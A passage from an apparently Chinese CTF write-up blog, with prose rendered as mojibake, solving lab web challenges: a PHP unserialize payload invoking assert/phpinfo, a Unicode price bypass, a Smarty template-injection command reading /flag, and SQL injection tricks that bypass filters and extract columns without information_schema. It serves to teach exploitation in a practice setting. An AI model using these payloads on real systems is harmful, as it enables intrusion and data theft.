        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å–µçš„è‚¿ä¹ˆè¶Šçœ‹è¶Šçœ¼ç†Ÿä»€ä¹ˆçš„ã€‚ã€‚ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span> <span class="token operator">?</span>php
<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string double-quoted-string">"ls"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°è¯•ï¼Œä½†æ²¡ååº”ã€‚ã€‚ã€‚</p>
<p>æ¢äº†ä¸ªmd5å¯ï¼Œçœ‹æ¥æ˜¯æŠŠsystemç»™banäº†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lktop/p/13745752.html">PHPä»£ç æ‰§è¡Œ/å‘½ä»¤æ‰§è¡Œæ€»ç»“ - lktop - åšå®¢å›­</a></p>
<p><del>å’</del></p>
<blockquote>
<p>åœ¨ PHP é‡Œï¼Œ<code>assert()</code> æ˜¯ä¸€ä¸ªç”¨äºæ–­è¨€çš„å‡½æ•°ã€‚å®ƒçš„ä½œç”¨æ˜¯åˆ¤æ–­æŸä¸ªè¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸï¼Œå¦‚æœè¡¨è¾¾å¼ä¸ºå‡ï¼Œå°±ä¼šè§¦å‘ä¸€ä¸ªæ–­è¨€å¤±è´¥çš„é”™è¯¯ã€‚<code>assert()</code> å‡½æ•°ä¸€èˆ¬æ¥æ”¶ä¸€ä¸ªè¡¨è¾¾å¼ä½œä¸ºå‚æ•°ï¼Œå½“è¿™ä¸ªè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœä¸º <code>false</code> æ—¶ï¼Œä¼šæ ¹æ®é…ç½®æ¥å†³å®šæ˜¯å¦æŠ›å‡ºå¼‚å¸¸æˆ–è€…å‘å‡ºè­¦å‘Šã€‚</p>
<p>è€Œ <code>phpinfo()</code> å‡½æ•°çš„åŠŸèƒ½æ˜¯è¾“å‡º PHP çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…å« PHP ç‰ˆæœ¬ã€ç¼–è¯‘é€‰é¡¹ã€åŠ è½½çš„æ‰©å±•ã€ç¯å¢ƒå˜é‡ç­‰è¯¸å¤šè¯¦ç»†å†…å®¹ã€‚è¯¥å‡½æ•°ä¼šå°†è¿™äº›ä¿¡æ¯ä»¥ HTML è¡¨æ ¼çš„å½¢å¼è¾“å‡ºåˆ°é¡µé¢ä¸Šï¼Œå¹¶ä¸”è¿”å›å€¼ä¸º <code>true</code>ã€‚</p>
<h3 id="ä»£ç æ‰§è¡Œæƒ…å†µ"><a href="#ä»£ç æ‰§è¡Œæƒ…å†µ" class="headerlink" title="ä»£ç æ‰§è¡Œæƒ…å†µ"></a>ä»£ç æ‰§è¡Œæƒ…å†µ</h3><p>å½“ä½ æ‰§è¡Œ <code>assert(phpinfo())</code> æ—¶ï¼Œä¼šæœ‰ä»¥ä¸‹æƒ…å†µå‘ç”Ÿï¼š</p>
<ol>
<li><strong><code>phpinfo()</code> å‡½æ•°å…ˆæ‰§è¡Œ</strong>ï¼šå®ƒä¼šè¾“å‡º PHP çš„è¯¦ç»†é…ç½®ä¿¡æ¯åˆ°é¡µé¢ä¸Šã€‚</li>
<li><strong><code>assert()</code> å¯¹ <code>phpinfo()</code> çš„è¿”å›å€¼è¿›è¡Œåˆ¤æ–­</strong>ï¼šå› ä¸º <code>phpinfo()</code> æ€»æ˜¯è¿”å› <code>true</code>ï¼Œæ‰€ä»¥ <code>assert()</code> é‡Œçš„æ¡ä»¶å§‹ç»ˆä¸ºçœŸï¼Œæ–­è¨€ä¸ä¼šå¤±è´¥ï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘æ–­è¨€å¤±è´¥çš„é”™è¯¯ã€‚</li>
</ol>
</blockquote>
<p>æ— æ•Œäº†</p>
<p><code>O:8:"HelloPhp":2:{s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";}</code></p>
<hr>
<h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!--Ah,really important,seriously. --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Unicorn shop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Don't be frustrated(æ²®ä¸§çš„) by the same view,we've changed the challenge content.--&gt;</span>
<span class="token comment">&lt;!-- Bootstrap core CSS --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/bootstrap.min.css?v=ec3bb52a00e176a7181d454dffaea219<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!-- Custom styles for this template --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/css/jumbotron-narrow.css?v=166844ff66a82256d62737c8a6fc14bf<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token comment">&lt;!--We still have some surprise for admin.password--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- /container --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¯•äº†è¯•IDä¸å¤ªå¯æ§ï¼Œpriceåˆ°æœ‰äº›è¯´æ³•ã€‚ã€‚ã€‚</p>
<p>çœ‹è§äº†<strong>Unicode</strong>æ ‡ç­¾ï¼Œé‚è¯•ã€‚æ‰¾ä¸ªæ¯”1337å¤§çš„Unicodeå•ä¸ªæ•°å­—å°±å¯ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/search?q=ten+thousand#characters">Search</a></p>
<p>æ‰¾ten thousand+numberå³å¯ã€‚ğ„«á¼ç­‰</p>
<hr>
<p>å—¯å“¼ï¼Œå…ˆé…±</p>
<hr>
<h3 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h3><blockquote>
<p>Build With Smarty !</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11666">æ–‡ç«  - Smartyæ¨¡æ¿æ³¨å…¥&amp;CVE-2017-1000480 - å…ˆçŸ¥ç¤¾åŒº</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3293de369c63d4fb011cc1d369f0921c.png"></p>
<p>å—¯å“¼</p>
<p><code>{if system('cat /flag')}{/if}</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ff7432e2eaba9512e5e0d0b84b4578d7.png"></p>
<p>ez</p>
<hr>
<h3 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h3><p>adminå·²æœ‰ï¼Œæ³¨å†Œä¸ªå·å¹¿å‘Šå¯xssã€‚çŒœæµ‹éœ€ç™»adminã€‚</p>
<p>çœ‹è§<!--å¾…ç®¡ç†ç¡®è®¤-->çŒœæµ‹å’ŒMysteryMessageBoardä¸€æ ·ã€‚ã€‚ã€‚</p>
<p><del>ç„¶åæ— æœ</del></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/eff7b5aa7c44fa9a1ac3325615f6fabc.png"></p>
<p>ç»ˆäºï¼çœ‹æ¥æ˜¯sql(</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hhhhhhhhh85/article/details/121328475">ã€CTFã€‘äºŒæ¬¡æ³¨å…¥åŸç†åŠå®æˆ˜-CSDNåšå®¢</a></p>
<p>æ€»ä¹‹å°±æ˜¯è¿›æ¥åˆå‡ºå»æ•°æ®åº“ã€‚ã€‚ã€‚</p>
<p><code>-1 ' order by 1#</code></p>
<!--æ ‡é¢˜å«æœ‰æ•æ„Ÿè¯æ±‡-->

<p><del>è¿™é¢˜è¿˜æœ‰ä¸ªæ— æ•Œçš„åœ°æ–¹ï¼Œå®ƒå¹¿å‘Šæœ‰ä¸Šé™ï¼ˆè¿˜ä¸èƒ½ä¸€æ¬¡çŸ¥é“é‚£äº›è¢«banäº†</del></p>
<p>orï¼ˆ=&gt;^â€™å¼‚æˆ–ï¼‰,æ³¨é‡Š(=&gt;â€™å•å¼•å·é—­åˆ)ï¼Œç©ºæ ¼éƒ½banäº†<del>(so,information_schemå“­è¾½)</del></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">origin_text <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>origin_text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'/**/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">èŠä¸€èŠbypass information_schema-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/q1stop/p/18024992">æ— åˆ—åsqlæ³¨å…¥ - qingshanboy - åšå®¢å›­</a></p>
<blockquote>
<p>è¿™é“é¢˜ç›®åœ¨buuojä¸Šçš„å¤ç°æ˜¯æ²¡åŠæ³•ç”¨sys.schemaæ¥bypass information_schemaçš„ï¼ŒåŸå› æ˜¯buuojæ²¡æœ‰sys.schema_table_statistics_with_bufferè¿™ä¸ªæ•°æ®åº“ï¼Œä½†æ˜¯æ¯”èµ›ä¸­æ˜¯å¯ä»¥åˆ©ç”¨çš„ã€‚</p>
</blockquote>
<p><strong>joinã€using</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">join</span>ç”¨äºåˆå¹¶ä¸¤ä¸ªè¡¨ï¼Œ<span class="token keyword">using</span>è¡¨ç¤ºä½¿ç”¨ä»€ä¹ˆå­—æ®µè¿›è¡Œè¿æ¥ï¼Œç”¨<span class="token keyword">using</span>æŒ‡å®šäº†è¿æ¥å­—æ®µåˆ™æŸ¥è¯¢ç»“æœåªè¿”å›è¿æ¥å­—æ®µ

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> <span class="token keyword">as</span> c
<span class="token comment">#è¿™é‡Œä½¿ç”¨idè¿›è¡Œè¿æ¥ï¼Œåªä¼šè¿”å›idåˆ—</span>
æ€è·¯ï¼šåˆ©ç”¨<span class="token keyword">join</span>åˆå¹¶åŒä¸€è¡¨ï¼ŒæŠ¥é”™é‡å¤çš„åˆ—åï¼Œå†åˆ©ç”¨<span class="token keyword">using</span>çˆ†å‡ºæ‰€æœ‰çš„åˆ—åï¼Œ<span class="token keyword">union</span> <span class="token keyword">select</span>éœ€è¦å‰åæŸ¥è¯¢çš„å­—æ®µæ•°ä¸€æ ·ï¼Œä¸ç„¶ä¼šæŠ¥
è¿™é‡Œå°† <span class="token keyword">user</span> è¡¨ä¸è‡ªèº«è¿›è¡Œè¿æ¥ï¼ˆ<span class="token keyword">join</span> <span class="token keyword">user</span>ï¼‰ï¼Œå¹¶ä½¿ç”¨ id å­—æ®µè¿›è¡Œè¿æ¥ï¼ˆ<span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>ï¼‰ã€‚ç”±äºä½¿ç”¨äº† <span class="token keyword">USING</span>ï¼Œç»“æœé›†ä¸­åªä¼šåŒ…å« id åˆ—ï¼ˆå› ä¸º id æ˜¯è¿æ¥å­—æ®µï¼‰ã€‚

<span class="token comment"># å¾—åˆ° id åˆ—åé‡å¤æŠ¥é”™</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
è¿™æ¡è¯­å¥å°è¯•å°† <span class="token keyword">user</span> è¡¨ä¸­ id ç­‰äº <span class="token number">1</span> çš„è®°å½•ï¼ˆ<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span>ï¼‰ä¸ <span class="token keyword">user</span> è¡¨è‡ªèº«è¿æ¥çš„ç»“æœï¼ˆ<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span><span class="token keyword">as</span> cï¼‰è¿›è¡Œ <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> æ“ä½œã€‚
ä½†æ˜¯ï¼Œç”±äº <span class="token keyword">user</span> è¡¨è‡ªèº«è¿æ¥æ—¶æ²¡æœ‰æŒ‡å®šè¿æ¥æ¡ä»¶ï¼Œä¼šå¯¼è‡´åˆ—åé‡å¤ï¼ˆå› ä¸ºä¸¤ä¸ª <span class="token keyword">user</span> è¡¨éƒ½æœ‰ç›¸åŒçš„åˆ—åï¼‰ï¼Œä»è€ŒæŠ¥é”™ã€‚

<span class="token comment"># å¾—åˆ° username åˆ—åé‡å¤æŠ¥é”™</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
è¿™é‡Œåœ¨è¿æ¥æ—¶ä½¿ç”¨äº† <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span>ï¼Œä½† <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> è¦æ±‚å‰åä¸¤ä¸ªæŸ¥è¯¢çš„å­—æ®µæ•°å¿…é¡»ç›¸åŒã€‚
å‰é¢çš„æŸ¥è¯¢ <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> ä¼šè¿”å› <span class="token keyword">user</span> è¡¨çš„æ‰€æœ‰åˆ—ï¼Œè€Œåé¢çš„æŸ¥è¯¢ <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c ç”±äº <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span> çš„é™åˆ¶ï¼Œåªè¿”å› id åˆ—ï¼Œå­—æ®µæ•°ä¸ä¸€è‡´ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚

<span class="token comment"># å¾—åˆ° password åˆ—åé‡å¤æŠ¥é”™</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
åŒæ ·ï¼Œå‰é¢çš„æŸ¥è¯¢è¿”å›æ‰€æœ‰åˆ—ï¼Œåé¢çš„æŸ¥è¯¢ç”±äº <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span> åªè¿”å› id å’Œ username åˆ—ï¼Œå­—æ®µæ•°ä¸ä¸€è‡´ï¼Œå¯¼è‡´æŠ¥é”™ã€‚

<span class="token comment"># å¾—åˆ° user è¡¨ä¸­çš„æ•°æ®</span>
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">all</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> c<span class="token punctuation">;</span>
è¿™é‡Œé€šè¿‡ <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> ä½¿å¾—åé¢çš„æŸ¥è¯¢è¿”å›çš„åˆ—ä¸å‰é¢çš„æŸ¥è¯¢ <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> è¿”å›çš„åˆ—æ•°å’Œåˆ—åä¸€è‡´ï¼ˆå‡è®¾ <span class="token keyword">user</span> è¡¨åªæœ‰ idã€username å’Œ password åˆ—ï¼‰ï¼Œä»è€Œå¯ä»¥æˆåŠŸæ‰§è¡Œ <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> æ“ä½œï¼Œå¾—åˆ° <span class="token keyword">user</span> è¡¨ä¸­çš„æ•°æ®ã€‚

 <span class="token keyword">JOIN</span> ç”¨äºåˆå¹¶ä¸¤ä¸ªè¡¨çš„æ•°æ®ã€‚åœ¨ <span class="token keyword">SQL</span> ä¸­ï¼Œæœ‰å¤šç§ç±»å‹çš„ <span class="token keyword">JOIN</span>ï¼Œå¦‚ <span class="token keyword">INNER</span> <span class="token keyword">JOIN</span>ã€<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> ç­‰ã€‚
<span class="token keyword">USING</span> æ˜¯ <span class="token keyword">JOIN</span> çš„ä¸€ç§å­å¥ï¼Œå®ƒç”¨äºæŒ‡å®šè¿æ¥ä¸¤ä¸ªè¡¨æ‰€ä¾æ®çš„åˆ—ã€‚å½“ä½¿ç”¨ <span class="token keyword">USING</span> æŒ‡å®šè¿æ¥å­—æ®µæ—¶ï¼ŒæŸ¥è¯¢ç»“æœä¸­åªä¼šåŒ…å«è¯¥è¿æ¥å­—æ®µä¸€æ¬¡ï¼ˆå› ä¸ºåœ¨ä¸¤ä¸ªè¡¨ä¸­è¯¥å­—æ®µæ˜¯ç›¸åŒçš„ï¼‰ï¼Œè€Œä¸æ˜¯åƒæ™®é€š <span class="token keyword">JOIN</span> é‚£æ ·å¯èƒ½å‡ºç°é‡å¤çš„åˆ—åã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åå‘ç°joinè¢«banäº†ï¼ˆ</p>
<p><del>å‘ƒï¼ˆåè¡€</del></p>
<p><strong>Q</strong>åˆè¯•äº†è¯•å…¶ä»–çš„æ–¹æ³•éƒ½ä¸è¡Œï¼ˆæˆ‘è®¤ä¸ºæ˜¯å®ƒä»¬æœ€åæœ‰ï¼›çš„åŸå› ï¼Ÿï¼‰ï¼Œé‚è¯•<strong>å­æŸ¥è¯¢</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a
<span class="token keyword">select</span> a<span class="token punctuation">.</span><span class="token number">2</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>a
<span class="token comment">#è®°å¾—ç¬¬ä¸€ä¸ª2åŠ åå¼•å·,æˆ–è€…ä½¿ç”¨a.2</span>
å¦‚æœåå¼•å·<span class="token identifier"><span class="token punctuation">`</span><span class="token punctuation">`</span></span>è¢«è¿‡æ»¤<span class="token punctuation">,</span>å¯ä»¥ä½¿ç”¨ä¸ºå­—æ®µèµ·åˆ«åçš„æ–¹å¼<span class="token punctuation">.</span>
<span class="token keyword">select</span> <span class="token identifier"><span class="token punctuation">`</span>2<span class="token punctuation">`</span></span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span> <span class="token keyword">as</span> xxx

<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>x<span class="token punctuation">.</span>c<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span>x<span class="token punctuation">;</span>

ç¬¬ä¸€ä¸ªæŸ¥è¯¢
<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span>
è¯¥æŸ¥è¯¢çš„åŠŸèƒ½æ˜¯ä» <span class="token keyword">user</span> è¡¨ä¸­é€‰å– id ç­‰äº <span class="token operator">-</span><span class="token number">1</span> çš„æ‰€æœ‰è¡Œã€‚
